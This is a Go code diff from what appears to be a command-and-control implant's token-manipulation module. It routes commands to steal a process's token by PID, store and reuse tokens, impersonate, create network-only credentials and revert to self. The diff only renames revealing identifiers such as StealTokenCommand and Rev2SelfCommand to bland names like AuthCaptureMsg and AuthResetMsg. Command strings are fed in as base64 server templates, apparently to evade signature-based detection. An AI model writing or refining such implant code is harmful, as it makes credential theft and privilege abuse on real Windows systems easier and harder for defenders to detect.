@@ -13,8 +13,8 @@ import (
 	"time"
 )
 
-// TokenTemplate holds the server-side template for token commands
-type TokenTemplate struct {
+// CredCfg holds the server-side template for token commands
+type CredCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -161,17 +161,17 @@ func tokActProcesses() string { return tokTpl(idxTokActProcesses) }
 
 func tokDefInteractive() string { return tokTpl(idxTokLogonInteractive) }
 
-// TokenCommand consolidates all token management functionality
-type TokenCommand struct {
-	tpl *TokenTemplate
+// CredMsg consolidates all token management functionality
+type CredMsg struct {
+	tpl *CredCfg
 }
 
-func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+func (c *CredMsg) execute(ctx *OpCtx, args []string) OpResult {
 	// Parse template from command data if present
-	if ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	if ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			c.tpl = &TokenTemplate{}
+			c.tpl = &CredCfg{}
 			if json.Unmarshal(decoded, c.tpl) == nil && c.tpl.Templates != nil {
 				SetTokenTemplate(c.tpl.Templates)
 			}
@@ -179,10 +179,10 @@ func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if len(args) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -228,10 +228,10 @@ func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		return c.handleRevert(ctx)
 
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E2, verb),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
@@ -240,25 +240,25 @@ func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult
 // Token Creation (from make-token)
 // ============================================================================
 
-func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandResult {
-	// Delegate to existing MakeTokenCommand logic
-	makeToken := &MakeTokenCommand{}
+func (c *CredMsg) handleCreate(ctx *OpCtx, args []string) OpResult {
+	// Delegate to existing AuthCreateMsg logic
+	makeToken := &AuthCreateMsg{}
 
 	if len(args) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Handle 'token create netonly' specially
 	if args[0] == tokVerbNetonly() {
 		if len(args) < 4 {
-			return CommandResult{
+			return OpResult{
 				Output:      Err(E1),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 		return makeToken.createNetOnlyToken(ctx, args[1], args[2], args[3])
@@ -266,10 +266,10 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 
 	// Regular token creation
 	if len(args) < 3 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -288,23 +288,23 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 // Token Stealing (from steal-token)
 // ============================================================================
 
-func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleSteal(ctx *OpCtx, args []string) OpResult {
+	stealToken := &AuthCaptureMsg{}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	pid, err := strconv.Atoi(args[0])
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E2, args[0]),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -323,23 +323,23 @@ func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandRe
 	return stealToken.stealAndImpersonate(ctx, pid, name, netOnly)
 }
 
-func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleStore(ctx *OpCtx, args []string) OpResult {
+	stealToken := &AuthCaptureMsg{}
 
 	if len(args) < 2 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	pid, err := strconv.Atoi(args[0])
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E2, args[0]),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -355,14 +355,14 @@ func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandRe
 // Token Usage
 // ============================================================================
 
-func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleUse(ctx *OpCtx, args []string) OpResult {
+	stealToken := &AuthCaptureMsg{}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -374,8 +374,8 @@ func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResu
 	return stealToken.useStoredToken(ctx, args[0], netOnly)
 }
 
-func (c *TokenCommand) handleImpersonate(ctx *CommandContext) CommandResult {
-	makeToken := &MakeTokenCommand{}
+func (c *CredMsg) handleImpersonate(ctx *OpCtx) OpResult {
+	makeToken := &AuthCreateMsg{}
 	return makeToken.impersonateToken(ctx)
 }
 
@@ -383,8 +383,8 @@ func (c *TokenCommand) handleImpersonate(ctx *CommandContext) CommandResult {
 // Network-Only Management
 // ============================================================================
 
-func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleNetOnly(ctx *OpCtx, args []string) OpResult {
+	stealToken := &AuthCaptureMsg{}
 
 	if len(args) == 0 {
 		return stealToken.showNetOnlyStatus()
@@ -394,10 +394,10 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 	switch action {
 	case tokActSet():
 		if len(args) < 2 {
-			return CommandResult{
+			return OpResult{
 				Output:      Err(E1),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 		return stealToken.setNetOnlyToken(ctx, args[1])
@@ -409,10 +409,10 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 		return stealToken.showNetOnlyStatus()
 
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E2, action),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
@@ -421,10 +421,10 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 // Token Listing/Info
 // ============================================================================
 
-func (c *TokenCommand) handleList(ctx *CommandContext, args []string) CommandResult {
+func (c *CredMsg) handleList(ctx *OpCtx, args []string) OpResult {
 	// Check if they want to list processes (token list processes)
 	if len(args) > 0 && args[0] == tokActProcesses() {
-		stealToken := &StealTokenCommand{}
+		stealToken := &AuthCaptureMsg{}
 		return stealToken.listTokens()
 	}
 
@@ -432,13 +432,13 @@ func (c *TokenCommand) handleList(ctx *CommandContext, args []string) CommandRes
 	return c.handleStored(ctx)
 }
 
-func (c *TokenCommand) handleStored(ctx *CommandContext) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleStored(ctx *OpCtx) OpResult {
+	stealToken := &AuthCaptureMsg{}
 	return stealToken.listStoredTokens()
 }
 
-func (c *TokenCommand) handleCurrent(ctx *CommandContext) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleCurrent(ctx *OpCtx) OpResult {
+	stealToken := &AuthCaptureMsg{}
 	return stealToken.getCurrentTokenInfo()
 }
 
@@ -446,26 +446,26 @@ func (c *TokenCommand) handleCurrent(ctx *CommandContext) CommandResult {
 // Token Cleanup
 // ============================================================================
 
-func (c *TokenCommand) handleRemove(ctx *CommandContext, args []string) CommandResult {
-	stealToken := &StealTokenCommand{}
+func (c *CredMsg) handleRemove(ctx *OpCtx, args []string) OpResult {
+	stealToken := &AuthCaptureMsg{}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	return stealToken.removeStoredToken(ctx, args[0])
 }
 
-func (c *TokenCommand) handleClear(ctx *CommandContext) CommandResult {
-	makeToken := &MakeTokenCommand{}
+func (c *CredMsg) handleClear(ctx *OpCtx) OpResult {
+	makeToken := &AuthCreateMsg{}
 	return makeToken.clearTokens(ctx)
 }
 
-func (c *TokenCommand) handleRevert(ctx *CommandContext) CommandResult {
-	rev2self := &Rev2SelfCommand{}
-	return rev2self.Execute(ctx, []string{})
+func (c *CredMsg) handleRevert(ctx *OpCtx) OpResult {
+	rev2self := &AuthResetMsg{}
+	return rev2self.execute(ctx, []string{})
 }
